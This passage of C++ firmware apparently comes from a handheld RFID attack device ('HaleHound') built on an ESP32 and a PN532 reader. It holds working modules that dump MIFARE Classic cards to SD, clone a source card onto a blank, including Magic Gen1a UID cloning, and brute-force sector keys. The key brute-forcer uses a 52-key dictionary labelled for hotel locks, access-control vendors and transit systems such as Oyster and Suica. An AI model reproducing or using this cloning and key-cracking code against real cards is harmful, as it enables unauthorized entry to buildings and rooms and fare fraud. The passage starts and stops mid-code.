                    drawCenteredRFID(RDR_INFO_Y + 38, "Only Classic 1K/4K supported", HALEHOUND_GUNMETAL);
                    state = READER_DONE;
                    break;
                }

                totalSectors = getSectorCount(cardSak);
                if (totalSectors > MAX_SECTORS) totalSectors = MAX_SECTORS;

                // Flash + redraw for reading phase
                drawCardFlash();
                clearContentArea();
                drawRFIDTitle(RDR_TITLE_Y, "CARD READER");
                drawRFIDSeparator(RDR_SEP_Y);

                tft.setTextSize(TEXT_SIZE_BODY);
                tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
                tft.setCursor(10, RDR_INFO_Y);
                tft.print("UID: ");
                for (int i = 0; i < cardUidLen; i++) tft.printf("%02X", cardUid[i]);

                tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
                tft.setCursor(10, RDR_INFO_Y + 14);
                tft.printf("%s  (%d sectors)", getCardTypeName(cardSak), totalSectors);

                state = READER_READING;
                currentSector = 0;
            }
            break;
        }

        case READER_READING: {
            if (currentSector >= totalSectors) {
                state = READER_DISPLAY;
                break;
            }

            // Gradient progress bar
            int barW = SCREEN_WIDTH - 40;
            int fillW = (currentSector * barW) / totalSectors;
            drawGradientBar(20, RDR_BAR_Y, barW, RDR_BAR_H, fillW);

            // Status text below bar
            tft.fillRect(10, RDR_STATUS_Y, SCREEN_WIDTH - 20, 12, TFT_BLACK);
            tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
            tft.setCursor(10, RDR_STATUS_Y);
            tft.printf("Sector %d/%d  OK:%d  Fail:%d", currentSector + 1, totalSectors, readOkCount, readFailCount);

#if RFID_DEMO_MODE
            for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
                for (int i = 0; i < BYTES_PER_BLOCK; i++) {
                    sectorData[currentSector][b][i] = (uint8_t)((currentSector * 16 + b * 4 + i) & 0xFF);
                }
            }
            sectorReadOk[currentSector] = true;
            delay(100);
#else
            sectorReadOk[currentSector] = authenticateAndReadSector(currentSector);
#endif
            if (sectorReadOk[currentSector]) {
                readOkCount++;
            } else {
                readFailCount++;
            }

            currentSector++;

            if (currentSector >= totalSectors) {
                // Complete — full gradient bar
                drawGradientBar(20, RDR_BAR_Y, barW, RDR_BAR_H, barW);

                tft.fillRect(10, RDR_STATUS_Y, SCREEN_WIDTH - 20, 12, TFT_BLACK);
                tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
                tft.setCursor(10, RDR_STATUS_Y);
                tft.printf("Done! %d/%d sectors read", readOkCount, totalSectors);

#if !RFID_DEMO_MODE
                saveDumpToSD();
#endif

                state = READER_DISPLAY;

                // Hex dump section
                drawRFIDSeparator(RDR_DUMP_TITLE_Y - 4);
                tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
                tft.setCursor(10, RDR_DUMP_TITLE_Y);
                tft.print("Sector data:");

                displayOffset = 0;
                drawReaderPage();
            }
            break;
        }

        case READER_DISPLAY: {
            int maxVisible = (SCROLL_BAR_Y - RDR_DUMP_DATA_Y) / SCROLL_ROW_H;
            if (handleScrollTouch(displayOffset, totalSectors, maxVisible)) {
                drawReaderPage();
            }
            delay(30);
            break;
        }

        case READER_DONE:
            break;
    }
}

void cleanup() {
    pn532Cleanup();
    state = READER_WAIT_CARD;
    exitRequested = false;
}

bool isExitRequested() {
    return exitRequested;
}

} // namespace RFIDReader

// ═══════════════════════════════════════════════════════════════════════════
// RFID CLONE — Read source, write to blank
// ═══════════════════════════════════════════════════════════════════════════

namespace RFIDClone {

static bool exitRequested = false;

enum CloneState {
    CLONE_WAIT_SOURCE,
    CLONE_READ_SOURCE,
    CLONE_WAIT_BLANK,
    CLONE_WRITING,
    CLONE_DONE
};

static CloneState state = CLONE_WAIT_SOURCE;
static uint8_t sourceUid[7] = {0};
static uint8_t sourceUidLen = 0;
static uint8_t sourceSak = 0;
static int totalSectors = 0;
static uint8_t sourceData[MAX_SECTORS][BLOCKS_PER_SECTOR][BYTES_PER_BLOCK];
static bool sourceSectorOk[MAX_SECTORS];

static bool writeToBlank(uint8_t* blankUid, uint8_t blankUidLen) {
    uint8_t keyBuf[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int writeOk = 0;
    int writeFail = 0;

    for (int s = 0; s < totalSectors && s < MAX_SECTORS; s++) {
        if (!sourceSectorOk[s]) continue; // Skip unreadable sectors

        int firstBlock = s * BLOCKS_PER_SECTOR;

        // Authenticate with factory key
        if (!nfc.mifareclassic_AuthenticateBlock(blankUid, blankUidLen, firstBlock, 0, keyBuf)) {
            writeFail++;
            continue;
        }

        for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
            int blockNum = firstBlock + b;

            // Skip Block 0 (UID block) on standard cards — can't write it
            if (blockNum == 0) continue;

            // Skip sector trailer if writing would lock us out
            // Sector trailer = last block of sector (block 3, 7, 11, etc.)
            if (b == BLOCKS_PER_SECTOR - 1) {
                // Write sector trailer carefully — preserve access bits, set keys
                // For safety, only write if source sector trailer has factory defaults
                uint8_t* trailer = sourceData[s][BLOCKS_PER_SECTOR - 1];
                // Check if access bits are default (FF 07 80 69)
                if (trailer[6] == 0xFF && trailer[7] == 0x07 && trailer[8] == 0x80) {
                    if (!nfc.mifareclassic_WriteDataBlock(blockNum, sourceData[s][b])) {
                        writeFail++;
                    } else {
                        writeOk++;
                    }
                }
                continue;
            }

            // Write data block
            if (!nfc.mifareclassic_WriteDataBlock(blockNum, sourceData[s][b])) {
                writeFail++;
            } else {
                writeOk++;
            }
        }
    }

    Serial.printf("[RFID] Clone complete: %d written, %d failed\n", writeOk, writeFail);
    return (writeFail == 0);
}

// Y positions for Clone layout
#define CLN_TITLE_Y      55
#define CLN_SEP_Y        68
#define CLN_INFO_Y       76
#define CLN_BAR_Y        120
#define CLN_BAR_H        12
#define CLN_MSG_Y        140

void setup() {
    exitRequested = false;
    state = CLONE_WAIT_SOURCE;
    totalSectors = 0;
    memset(sourceData, 0, sizeof(sourceData));
    memset(sourceSectorOk, 0, sizeof(sourceSectorOk));

    tft.fillScreen(TFT_BLACK);
    drawRFIDIconBar("Card Clone");
    drawRFIDTitle(CLN_TITLE_Y, "CARD CLONE");
    drawRFIDSeparator(CLN_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);

    if (!pn532Init()) {
        drawCenteredRFID(CLN_INFO_Y, "PN532 NOT FOUND!", HALEHOUND_HOTPINK);
        drawCenteredRFID(CLN_INFO_Y + 18, "Tap BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    // Step indicator
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(10, CLN_INFO_Y);
    tft.print("[Step 1/3]");

    drawCenteredRFID(CLN_INFO_Y + 18, "Hold SOURCE card to reader", HALEHOUND_MAGENTA);
    drawCenteredRFID(CLN_INFO_Y + 34, "(card to copy FROM)", HALEHOUND_GUNMETAL);
}

void loop() {
    if (exitRequested) return;

    switch (state) {
        case CLONE_WAIT_SOURCE: {
            uint8_t uid[7] = {0};
            uint8_t uidLen = 0;
            bool detected = false;
#if RFID_DEMO_MODE
            static unsigned long cloneDemoStart = 0;
            if (cloneDemoStart == 0) cloneDemoStart = millis();
            if (millis() - cloneDemoStart > 2000) {
                uid[0] = 0xCA; uid[1] = 0xFE; uid[2] = 0xBA; uid[3] = 0xBE;
                uidLen = 4;
                detected = true;
                cloneDemoStart = 0;
            }
#else
            detected = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100);
#endif
            if (detected) {
                memcpy(sourceUid, uid, uidLen);
                sourceUidLen = uidLen;
#if RFID_DEMO_MODE
                sourceSak = 0x08;
#else
                sourceSak = getLastSAK();
#endif
                if (!isMifareClassic(sourceSak)) {
                    clearContentArea();
                    drawRFIDTitle(CLN_TITLE_Y, "CARD CLONE");
                    drawRFIDSeparator(CLN_SEP_Y);
                    drawCenteredRFID(CLN_INFO_Y, "Not MIFARE Classic!", HALEHOUND_HOTPINK);
                    drawCenteredRFID(CLN_INFO_Y + 18, "Tap BACK to exit", HALEHOUND_GUNMETAL);
                    state = CLONE_DONE;
                    break;
                }

                totalSectors = getSectorCount(sourceSak);
                if (totalSectors > MAX_SECTORS) totalSectors = MAX_SECTORS;

                drawCardFlash();
                clearContentArea();
                drawRFIDTitle(CLN_TITLE_Y, "CARD CLONE");
                drawRFIDSeparator(CLN_SEP_Y);

                tft.setTextSize(TEXT_SIZE_BODY);
                tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
                tft.setCursor(10, CLN_INFO_Y);
                tft.print("[Step 2/3]  Reading source...");

                tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
                tft.setCursor(10, CLN_INFO_Y + 16);
                tft.print("UID: ");
                for (int i = 0; i < sourceUidLen; i++) tft.printf("%02X", sourceUid[i]);

                tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
                tft.setCursor(10, CLN_INFO_Y + 30);
                tft.printf("%s  (%d sectors)", getCardTypeName(sourceSak), totalSectors);

                state = CLONE_READ_SOURCE;
            }
            break;
        }

        case CLONE_READ_SOURCE: {
            int readOk = 0;
#if RFID_DEMO_MODE
            for (int s = 0; s < totalSectors; s++) {
                for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
                    for (int i = 0; i < BYTES_PER_BLOCK; i++) {
                        sourceData[s][b][i] = (uint8_t)((s * 16 + b * 4 + i) & 0xFF);
                    }
                }
                sourceSectorOk[s] = true;
                readOk++;
            }
            delay(500);
#else
            for (int s = 0; s < totalSectors; s++) {
                int firstBlock = s * BLOCKS_PER_SECTOR;
                uint8_t keyBuf[6];
                bool found = false;

                for (uint8_t k = 0; k < NUM_DEFAULT_KEYS && !found; k++) {
                    memcpy(keyBuf, defaultKeys[k], 6);
                    if (nfc.mifareclassic_AuthenticateBlock(sourceUid, sourceUidLen, firstBlock, 0, keyBuf)) {
                        bool allOk = true;
                        for (int b = 0; b < BLOCKS_PER_SECTOR; b++) {
                            if (!nfc.mifareclassic_ReadDataBlock(firstBlock + b, sourceData[s][b])) {
                                allOk = false;
                                memset(sourceData[s][b], 0, BYTES_PER_BLOCK);
                            }
                        }
                        sourceSectorOk[s] = allOk;
                        if (allOk) readOk++;
                        found = true;
                    }
                }
            }
#endif
            // Show read result with gradient bar
            int barW = SCREEN_WIDTH - 40;
            drawGradientBar(20, CLN_BAR_Y, barW, CLN_BAR_H, barW);

            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.setCursor(10, CLN_BAR_Y + 20);
            tft.printf("Read %d/%d sectors OK", readOk, totalSectors);

            drawRFIDSeparator(CLN_MSG_Y + 16);

            tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
            tft.setCursor(10, CLN_MSG_Y + 24);
            tft.print("[Step 3/3]");

            drawCenteredRFID(CLN_MSG_Y + 40, "Remove source card", HALEHOUND_MAGENTA);
            drawCenteredRFID(CLN_MSG_Y + 56, "then hold BLANK card", HALEHOUND_MAGENTA);
            drawCenteredRFID(CLN_MSG_Y + 74, "(Magic Gen1a for UID clone)", HALEHOUND_GUNMETAL);

            delay(2000);
            state = CLONE_WAIT_BLANK;
            break;
        }

        case CLONE_WAIT_BLANK: {
            uint8_t uid[7] = {0};
            uint8_t uidLen = 0;
            bool blankDetected = false;
#if RFID_DEMO_MODE
            static unsigned long blankDemoStart = 0;
            if (blankDemoStart == 0) blankDemoStart = millis();
            if (millis() - blankDemoStart > 3000) {
                uid[0] = 0x00; uid[1] = 0x11; uid[2] = 0x22; uid[3] = 0x33;
                uidLen = 4;
                blankDetected = true;
                blankDemoStart = 0;
            }
#else
            if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100)) {
                if (memcmp(uid, sourceUid, uidLen) == 0 && uidLen == sourceUidLen) {
                    break;
                }
                blankDetected = true;
            }
#endif
            if (blankDetected) {
                clearContentArea();
                drawRFIDTitle(CLN_TITLE_Y, "CARD CLONE");
                drawRFIDSeparator(CLN_SEP_Y);

                tft.setTextSize(TEXT_SIZE_BODY);
                tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
                tft.setCursor(10, CLN_INFO_Y);
                tft.print("Writing to: ");
                for (int i = 0; i < uidLen; i++) tft.printf("%02X", uid[i]);

                tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
                tft.setCursor(10, CLN_INFO_Y + 18);
                tft.print("DO NOT REMOVE CARD!");

                state = CLONE_WRITING;

                // Animated writing progress bar
                int barW = SCREEN_WIDTH - 40;
#if RFID_DEMO_MODE
                for (int p = 0; p <= barW; p += 4) {
                    drawGradientBar(20, CLN_BAR_Y, barW, CLN_BAR_H, p);
                    delay(15);
                }
                bool ok = true;
#else
                bool ok = writeToBlank(uid, uidLen);
                drawGradientBar(20, CLN_BAR_Y, barW, CLN_BAR_H, barW);
#endif

                int y = CLN_BAR_Y + 22;
                if (ok) {
                    drawCenteredRFID(y, "CLONE SUCCESSFUL!", HALEHOUND_GREEN);
                } else {
                    drawCenteredRFID(y, "Clone had errors", HALEHOUND_HOTPINK);
                    y += 16;
                    drawCenteredRFID(y, "Some sectors may not match", HALEHOUND_GUNMETAL);
                }

                y += 22;
                drawRFIDSeparator(y);
                y += 8;
                drawCenteredRFID(y, "NOTE: UID unchanged unless", HALEHOUND_GUNMETAL);
                y += 14;
                drawCenteredRFID(y, "using Magic Gen1a card", HALEHOUND_GUNMETAL);

                state = CLONE_DONE;
            }
            break;
        }

        case CLONE_WRITING:
            break;

        case CLONE_DONE:
            break;
    }
}

void cleanup() {
    pn532Cleanup();
    state = CLONE_WAIT_SOURCE;
    exitRequested = false;
}

bool isExitRequested() {
    return exitRequested;
}

} // namespace RFIDClone

// ═══════════════════════════════════════════════════════════════════════════
// RFID BRUTE FORCE — Try known keys against all sectors (dual-core)
// ═══════════════════════════════════════════════════════════════════════════

namespace RFIDBrute {

static bool exitRequested = false;

// Extended key dictionary — 50+ known default keys
static const uint8_t NUM_BRUTE_KEYS = 52;
static const uint8_t bruteKeys[NUM_BRUTE_KEYS][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Factory default
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},  // MAD key A
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},  // MAD key B
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},  // NFC Forum
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // Null key
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},  // NDEF
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},  // Hotel/access
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},  // Test key
    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97},  // Samsung/Gallagher
    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F},  // Gallagher 2
    {0xA0, 0x47, 0x8C, 0xC3, 0x90, 0x91},  // Schlage
    {0x53, 0x3C, 0xB6, 0xC7, 0x23, 0xF6},  // HID iClass
    {0x8F, 0xD0, 0xA4, 0xF2, 0x56, 0xE9},  // Vingcard
    {0xFC, 0x00, 0x01, 0x87, 0x78, 0xF7},  // Saflok
    {0x50, 0x9D, 0x5F, 0xEC, 0xFB, 0x17},  // MIZIP
    {0x6A, 0x1D, 0x87, 0xB8, 0x04, 0x27},  // Onity
    {0x2A, 0x2C, 0x13, 0xCC, 0x24, 0x2A},  // Dormakaba
    {0xA2, 0x2A, 0xE1, 0x29, 0xC0, 0x13},  // Kaba
    {0x49, 0xFA, 0xE4, 0xE3, 0x84, 0x9F},  // ASSA ABLOY
    {0x38, 0xFC, 0xF3, 0x30, 0x72, 0xE0},  // Urmet
    {0x8B, 0x8D, 0xAE, 0x1E, 0xF9, 0x0F},  // Dormakaba 2
    {0x50, 0x93, 0x59, 0xF1, 0x31, 0xB1},  // Gym/fitness
    {0x6C, 0x26, 0x5F, 0x5A, 0x41, 0x4F},  // Vendotek
    {0x31, 0x4B, 0x49, 0x47, 0x49, 0x56},  // Moscow metro
    {0xA7, 0x3F, 0x5D, 0xC1, 0xD0, 0x2F},  // Social Moscow
    {0xE2, 0xB4, 0x53, 0xAF, 0x60, 0x5B},  // Troika
    {0x2A, 0x5D, 0x8B, 0x8E, 0x4E, 0x14},  // Beijing transit
    {0x96, 0xA3, 0x01, 0xAC, 0xE4, 0xBF},  // Shenzhen Tong
    {0x6B, 0x03, 0xD2, 0x79, 0xCB, 0x20},  // Bangkok BTS
    {0xFB, 0xDB, 0x2C, 0x56, 0x15, 0xD0},  // OV-chipkaart
    {0x23, 0x4A, 0xFB, 0xBC, 0xE5, 0xA7},  // Lisbon Viva
    {0x68, 0x6D, 0xBD, 0x53, 0xB0, 0x79},  // Istanbul
    {0x2B, 0x7F, 0x34, 0x6D, 0x06, 0xC2},  // Delhi Metro
    {0xE5, 0x62, 0x92, 0xD4, 0x39, 0x61},  // Warsaw transit
    {0xE1, 0x24, 0xC1, 0xA4, 0xB5, 0x2A},  // Oyster
    {0x09, 0x12, 0x5C, 0x96, 0x01, 0xE2},  // Clipper
    {0xFC, 0x25, 0x43, 0x76, 0x64, 0xA1},  // SL Stockholm
    {0x07, 0x38, 0x8E, 0x6E, 0xA6, 0xC6},  // Octopus
    {0x50, 0x83, 0x58, 0x6E, 0x4F, 0xA6},  // Suica
    {0x6F, 0x99, 0xC3, 0x20, 0xB3, 0xCA},  // T-Money
    {0xA6, 0x4F, 0x50, 0x82, 0x88, 0x6C},  // EZ-Link
    {0xE5, 0x25, 0x16, 0x44, 0xB7, 0xFD},  // myki
    {0x84, 0xC6, 0x95, 0x83, 0xE8, 0xBC},  // Navigo
    {0xFD, 0xBC, 0xE5, 0x24, 0x67, 0xA1},  // Campus card
    {0xD0, 0x05, 0xFD, 0x05, 0xD0, 0x05},  // Parking garage
    {0x48, 0xBB, 0xF9, 0xEE, 0x5E, 0x10},  // Ski pass
    {0x4A, 0x2D, 0xED, 0x3A, 0x17, 0xC8},  // Amusement park
    {0x55, 0x00, 0x55, 0x00, 0x55, 0x00},  // Common pattern
    {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC},  // Hex sequential
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56},  // Hex sequential 2
    {0x01, 0x02, 0x03, 0x04, 0x05, 0x06},  // Counter key
    {0x11, 0x22, 0x33, 0x44, 0x55, 0x66},  // Repeated pairs
};

// Dual-core shared state
static volatile int bruteSector = 0;
static volatile int bruteKeyIdx = 0;
static volatile int foundCount = 0;
static volatile bool bruteRunning = false;
static volatile bool bruteDone = false;
static volatile bool frameReady = false;
static bool resultsShown = false;  // Prevents done handler from looping
static int scrollOffset = 0;      // Scroll offset for results display
static TaskHandle_t bruteTaskHandle = NULL;

static uint8_t bruteUid[7] = {0};
static uint8_t bruteUidLen = 0;
static int bruteTotalSectors = 0;

// Results: which key works for each sector
static uint8_t foundKeyA[MAX_SECTORS][6];
static uint8_t foundKeyB[MAX_SECTORS][6];
static bool hasKeyA[MAX_SECTORS];
static bool hasKeyB[MAX_SECTORS];

// Re-activate card after failed auth (MIFARE Classic enters HALT state on wrong key)
static bool reactivateCard() {
    uint8_t tmpUid[7];
    uint8_t tmpLen = 0;
    return nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tmpUid, &tmpLen, 50);
}

// Core 0 brute force task
static void bruteForceTask(void* param) {
    uint8_t keyBuf[6];
    Serial.printf("[BRUTE] Task started on Core %d, sectors=%d, keys=%d\n",
                  xPortGetCoreID(), bruteTotalSectors, NUM_BRUTE_KEYS);

    for (int s = 0; s < bruteTotalSectors && bruteRunning; s++) {
        bruteSector = s;
        int firstBlock = s * BLOCKS_PER_SECTOR;
        Serial.printf("[BRUTE] Sector %d (block %d)\n", s, firstBlock);
        bool needReactivate = false;

        for (int k = 0; k < NUM_BRUTE_KEYS && bruteRunning; k++) {
            bruteKeyIdx = k;
            memcpy(keyBuf, bruteKeys[k], 6);

            // Re-activate card if previous auth failed (card HALTed)
            if (needReactivate) {
                if (!reactivateCard()) {
                    Serial.printf("[BRUTE] Card lost at S%d K%d — stopping\n", s, k);
                    bruteRunning = false;
                    break;
                }
                needReactivate = false;
            }

            // Try Key A
            if (!hasKeyA[s]) {
                if (nfc.mifareclassic_AuthenticateBlock(bruteUid, bruteUidLen, firstBlock, 0, keyBuf)) {
                    memcpy(foundKeyA[s], bruteKeys[k], 6);
                    hasKeyA[s] = true;
                    foundCount++;
                    frameReady = true;
                    Serial.printf("[BRUTE] S%d KeyA FOUND: %02X%02X%02X%02X%02X%02X\n",
                                  s, keyBuf[0], keyBuf[1], keyBuf[2], keyBuf[3], keyBuf[4], keyBuf[5]);
                    needReactivate = true; // Auth changes card state, re-activate for next attempt
                } else {
                    needReactivate = true; // Failed auth → card HALTed
                }
            }

            // Try Key B (re-activate first if Key A attempt changed card state)
            if (!hasKeyB[s]) {
                if (needReactivate) {
                    if (!reactivateCard()) {
                        Serial.printf("[BRUTE] Card lost at S%d K%d KeyB — stopping\n", s, k);
                        bruteRunning = false;
                        break;
                    }
                    needReactivate = false;
                }
                if (nfc.mifareclassic_AuthenticateBlock(bruteUid, bruteUidLen, firstBlock, 1, keyBuf)) {
                    memcpy(foundKeyB[s], bruteKeys[k], 6);
                    hasKeyB[s] = true;
                    foundCount++;
                    frameReady = true;
                    Serial.printf("[BRUTE] S%d KeyB FOUND: %02X%02X%02X%02X%02X%02X\n",
                                  s, keyBuf[0], keyBuf[1], keyBuf[2], keyBuf[3], keyBuf[4], keyBuf[5]);
                    needReactivate = true;
                } else {
                    needReactivate = true;
                }
            }

            // Both found for this sector, move on
            if (hasKeyA[s] && hasKeyB[s]) break;

            // Yield every 4 keys to prevent Core 0 watchdog timeout
            if (k % 4 == 3) delay(1);
        }
    }

    Serial.printf("[BRUTE] Task done — found %d keys\n", foundCount);
    bruteDone = true;
    bruteRunning = false;
    // Only delete task if running as a FreeRTOS task (not called inline)
    if (bruteTaskHandle) {
        bruteTaskHandle = NULL;
        vTaskDelete(NULL);
    }
}

static void saveKeysToSD() {
    spiDeselect();
    delay(10);

    if (!spiSelectSD()) return;

    bool sdOk = SD.begin(SD_CS);
    if (!sdOk) {
        SPI.begin(18, 19, 23, SD_CS);
        sdOk = SD.begin(SD_CS, SPI, 4000000);
    }
    if (!sdOk) return;
    if (!SD.exists("/rfid")) {
        SD.mkdir("/rfid");
    }

    char filename[50];
    snprintf(filename, sizeof(filename), "/rfid/KEYS_");
    int pos = strlen(filename);
    for (int i = 0; i < bruteUidLen; i++) {
        pos += snprintf(filename + pos, sizeof(filename) - pos, "%02X", bruteUid[i]);
    }
    snprintf(filename + pos, sizeof(filename) - pos, ".txt");

    File f = SD.open(filename, FILE_WRITE);
    if (!f) {
        spiDeselect();
        return;
    }

    f.printf("UID: ");
    for (int i = 0; i < bruteUidLen; i++) {
        if (i > 0) f.print(" ");
        f.printf("%02X", bruteUid[i]);
    }
    f.println();
    f.println();

    for (int s = 0; s < bruteTotalSectors; s++) {
        f.printf("Sector %02d: ", s);
        if (hasKeyA[s]) {
            f.print("KeyA=");
            for (int i = 0; i < 6; i++) f.printf("%02X", foundKeyA[s][i]);
        } else {
            f.print("KeyA=??????");
        }
        f.print("  ");
        if (hasKeyB[s]) {
            f.print("KeyB=");
            for (int i = 0; i < 6; i++) f.printf("%02X", foundKeyB[s][i]);
        } else {
            f.print("KeyB=??????");
        }
        f.println();
    }

    f.close();
    SD.end();
    spiDeselect();

    Serial.printf("[RFID] Keys saved to %s\n", filename);
}

// Y positions for Brute layout (scaled for 2.8"/3.5")
#define BRT_TITLE_Y      SCALE_Y(55)
#define BRT_SEP_Y        SCALE_Y(68)
#define BRT_INFO_Y       SCALE_Y(76)
#define BRT_PROGRESS_Y   SCALE_Y(108)
#define BRT_BAR_Y        SCALE_Y(128)
#define BRT_BAR_H        SCALE_H(12)
#define BRT_RESULTS_Y    SCALE_Y(150)
#define BRT_DATA_Y       (BRT_RESULTS_Y + 14)

static void drawBrutePage() {
    int maxVisible = (SCROLL_BAR_Y - BRT_DATA_Y) / SCROLL_ROW_H;
    tft.fillRect(0, BRT_DATA_Y, SCREEN_WIDTH, SCROLL_BAR_Y - BRT_DATA_Y, TFT_BLACK);
    tft.setTextSize(TEXT_SIZE_BODY);
    int ry = BRT_DATA_Y;
    for (int i = 0; i < maxVisible && (scrollOffset + i) < bruteTotalSectors; i++) {
        int s = scrollOffset + i;
        float sRatio = (float)s / (float)bruteTotalSectors;
        tft.setTextColor(rfidGradientColor(sRatio), TFT_BLACK);
        tft.setCursor(2, ry);
        tft.printf("S%02d ", s);
        if (hasKeyA[s]) {
            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.print("A:");
            for (int j = 0; j < 6; j++) tft.printf("%02X", foundKeyA[s][j]);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.print("A:------------");
        }
        tft.print(" ");
        if (hasKeyB[s]) {
            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.print("B:");
            for (int j = 0; j < 6; j++) tft.printf("%02X", foundKeyB[s][j]);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.print("B:------------");
        }
        ry += SCROLL_ROW_H;
    }
    drawScrollBar(scrollOffset, bruteTotalSectors, maxVisible);
}

void setup() {
    exitRequested = false;
    bruteDone = false;
    bruteRunning = false;
    resultsShown = false;
    scrollOffset = 0;
    foundCount = 0;
    bruteSector = 0;
    bruteKeyIdx = 0;
    memset(hasKeyA, 0, sizeof(hasKeyA));
    memset(hasKeyB, 0, sizeof(hasKeyB));

    tft.fillScreen(TFT_BLACK);
    drawRFIDIconBar("Key Brute Force");
    drawRFIDTitle(BRT_TITLE_Y, "KEY BRUTE");
    drawRFIDSeparator(BRT_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);

    if (!pn532Init()) {
        drawCenteredRFID(BRT_INFO_Y, "PN532 NOT FOUND!", HALEHOUND_HOTPINK);
        drawCenteredRFID(BRT_INFO_Y + 18, "Tap BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    drawCenteredRFID(BRT_INFO_Y + 6, "Hold MIFARE card to reader", HALEHOUND_MAGENTA);
    drawCenteredRFID(BRT_INFO_Y + 22, "52 keys x 16 sectors", HALEHOUND_GUNMETAL);
}

void loop() {
    if (exitRequested) {
        bruteRunning = false;
        return;
    }

    if (!bruteRunning && !bruteDone) {
        // Wait for card
        uint8_t uid[7] = {0};
        uint8_t uidLen = 0;
        bool detected = false;
        uint8_t sak = 0;
#if RFID_DEMO_MODE
        static unsigned long bruteDemoStart = 0;
        if (bruteDemoStart == 0) bruteDemoStart = millis();
        if (millis() - bruteDemoStart > 2000) {
            uid[0] = 0xBE; uid[1] = 0xEF; uid[2] = 0xCA; uid[3] = 0xFE;
            uidLen = 4;
            sak = 0x08; // Classic 1K
            detected = true;
            bruteDemoStart = 0;
        }
#else
        if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100)) {
            sak = getLastSAK();
            detected = true;
        }
#endif
        if (detected) {
            memcpy(bruteUid, uid, uidLen);
            bruteUidLen = uidLen;

            Serial.printf("[BRUTE] Card detected! UID=");
            for (int i = 0; i < uidLen; i++) Serial.printf("%02X", uid[i]);
            Serial.printf(" SAK=0x%02X uidLen=%d\n", sak, uidLen);
            Serial.printf("[BRUTE] Free heap: %d, largest block: %d\n",
                          ESP.getFreeHeap(), ESP.getMaxAllocHeap());

            if (!isMifareClassic(sak)) {
                clearContentArea();
                drawRFIDTitle(BRT_TITLE_Y, "KEY BRUTE");
                drawRFIDSeparator(BRT_SEP_Y);
                drawCenteredRFID(BRT_INFO_Y, "Not MIFARE Classic!", HALEHOUND_HOTPINK);
                bruteDone = true;
                return;
            }

            bruteTotalSectors = getSectorCount(sak);
            if (bruteTotalSectors > MAX_SECTORS) bruteTotalSectors = MAX_SECTORS;

            drawCardFlash();
            clearContentArea();
            drawRFIDTitle(BRT_TITLE_Y, "KEY BRUTE");
            drawRFIDSeparator(BRT_SEP_Y);

            tft.setTextSize(TEXT_SIZE_BODY);
            tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
            tft.setCursor(10, BRT_INFO_Y);
            tft.print("UID: ");
            for (int i = 0; i < bruteUidLen; i++) tft.printf("%02X", bruteUid[i]);

            tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
            tft.setCursor(10, BRT_INFO_Y + 14);
            tft.printf("Testing %d keys x %d sectors", NUM_BRUTE_KEYS, bruteTotalSectors);

            bruteRunning = true;
            frameReady = false;

#if RFID_DEMO_MODE
            // Demo: don't launch real task — simulate progress in loop()
#else
            Serial.println("[BRUTE] Running brute force inline (Core 1)...");
            // Run brute force INLINE on Core 1 — no dual-core task
            // This blocks the display during execution but eliminates SPI conflicts
            bruteForceTask(NULL);
            Serial.println("[BRUTE] Inline brute force returned");
#endif
        }
        return;
    }

#if RFID_DEMO_MODE
    // Demo: simulate brute force progress — advance sector/key each frame
    if (bruteRunning && !bruteDone) {
        static unsigned long lastBruteDemo = 0;
        if (millis() - lastBruteDemo > 40) { // ~25 FPS animation
            lastBruteDemo = millis();
            bruteKeyIdx += 3; // Skip ahead for speed
            if (bruteKeyIdx >= NUM_BRUTE_KEYS) {
                bruteKeyIdx = 0;
                // "Find" a key for this sector (demo)
                if (!hasKeyA[bruteSector]) {
                    memcpy(foundKeyA[bruteSector], bruteKeys[bruteSector % NUM_BRUTE_KEYS], 6);
                    hasKeyA[bruteSector] = true;
                    foundCount++;
                }
                bruteSector++;
